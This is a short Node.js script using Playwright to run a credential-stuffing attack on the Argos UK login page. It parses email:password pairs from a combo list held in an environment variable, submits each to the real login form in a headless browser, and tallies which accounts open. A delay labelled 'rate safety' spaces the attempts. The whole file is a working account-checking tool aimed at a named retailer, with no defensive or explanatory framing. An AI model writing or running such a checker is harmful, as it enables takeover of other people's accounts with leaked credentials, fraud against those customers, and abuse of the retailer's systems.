// runner.js
function parseLine(line) {
  const match = line.match(
    /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\:([^\s]+)/ 
  );

  if (!match) return null;

  return {
    email: match[1],
    password: match[2]
  };
}
const { chromium } = require('playwright');

const LOGIN_URL = 'https://www.argos.co.uk/login?pageName=account&successUrl=%2Fmy-account%2Fhome';
const logins = process.env.LOGINS.split('\n');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage();

  let ok = 0;
  let fail = 0;

  for (const line of logins) {
    const parsed = parseLine(line);
    if (!parsed) {
      console.log('SKIPPED:', line);
      continue;
    }

    const { email, password } = parsed;
    console.log(`➡️ Trying ${email}`);

    try {
      await page.goto(LOGIN_URL, { waitUntil: 'domcontentloaded' });

      await page.fill(
        'input[type="email"], input[aria-label="Email address"]',
        email
      );

      await page.fill(
        'input[type="password"]',
        password
      );

      await page.click('button:has-text("Sign in securely")');

      // ✅ SUCCESS CHECK (pick ONE that applies)
      await page.waitForURL(/dashboard|account|home/, { timeout: 7000 });

      console.log(`✅ ${email}`);
      ok++;
    } catch (err) {
      console.log(`❌ ${email}`);
      fail++;
    }

    await page.waitForTimeout(1500); // rate safety
  }

  console.log(`\nRESULTS`);
  console.log(`OK: ${ok}`);
  console.log(`FAIL: ${fail}`);

  await browser.close();
})();